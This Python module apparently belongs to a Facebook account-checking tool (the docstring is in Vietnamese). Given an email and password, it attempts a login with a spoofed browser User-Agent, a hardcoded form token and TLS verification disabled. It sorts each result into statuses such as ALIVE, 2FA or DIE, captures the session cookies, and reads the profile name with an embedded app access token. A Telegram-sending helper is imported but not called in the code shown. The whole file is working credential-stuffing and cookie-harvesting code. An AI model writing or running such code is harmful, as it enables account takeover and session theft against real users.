import re
import json
import base64
import time
import requests
from ..utils.helpers import window1
from ..utils.telegram import send_telegram

def get_profile_name(cookie_dict):
    try:
        s = requests.Session()
        s.cookies.update(cookie_dict)
        headers = {'User-Agent': window1()}
        r = s.get('https://graph.facebook.com/me?fields=name&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32', headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json().get('name', 'Unknown')
        r2 = s.get('https://www.facebook.com/me', headers=headers, timeout=10)
        match = re.search(r'<title>(.*?)</title>', r2.text)
        if match:
            title = match.group(1).strip().split('|')[0].strip()
            return title.split('(')[0].strip() if '(' in title else title
        return 'Unknown'
    except:
        return 'Unknown'

def classify_and_get_cookie(email, password):
    """Đăng nhập thử và phân loại tài khoản, trả về (status, cookie_str, name)"""
    ts = int(time.time())
    enctoken = base64.b64encode(json.dumps({"type":0,"creation_time":ts,"callsite_id":381229079575946}).encode()).decode()
    headers = {'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {
        'email': email,
        'encpass': f"#PWD_INSTAGRAM:0:{ts}:{password}",
        'lsd': 'AVq53wqah7M',
        'login_source': 'comet_headerless_login'
    }
    try:
        r = requests.post('https://www.facebook.com/login/', params={'privacy_mutation_token': enctoken},
                          headers=headers, data=data, timeout=15, verify=False, allow_redirects=False)
        html = r.text.lower()
        cookies = r.cookies.get_dict()
        cookie_str = '; '.join(f"{k}={v}" for k,v in cookies.items()) if cookies else ''
        
        if 'c_user' in cookies:
            name = get_profile_name(cookies)
            return ('ALIVE', cookie_str, name)
        if re.search(r'checkpoint|two_factor|2fa|approvals_code|login_approval', html):
            name = get_profile_name(cookies) if cookies else ''
            return ('2FA', cookie_str, name)
        if re.search(r'account[\s_-]?disabled|your account has been disabled|account has been locked', html):
            return ('ACCOUNT_DISABLED', cookie_str, '')
        if re.search(r'temporarily[\s_-]?(locked|blocked|unavailable)|action[\s_-]?blocked|too many attempts', html):
            return ('TEMP_BLOCK', cookie_str, '')
        if re.search(r'incorrect.*password|invalid.*password|wrong.*password|password.*incorrect|the password you', html):
            return ('DIE', cookie_str, '')
        if re.search(r'confirm.*email|verify.*email|send.*code.*email|email.*confirmation|check your email', html):
            return ('UNVERIFIED_EMAIL', cookie_str, '')
        if re.search(r'confirm.*phone|verify.*phone|send.*code.*phone|phone.*confirmation|check your phone', html):
            return ('UNVERIFIED_PHONE', cookie_str, '')
        if re.search(r'rate[\s_-]?limit|too many requests|try again later', html):
            return ('RATE_LIMIT', cookie_str, '')
        return ('UNKNOWN', cookie_str, '')
    except Exception:
        return ('ERROR', '', '')
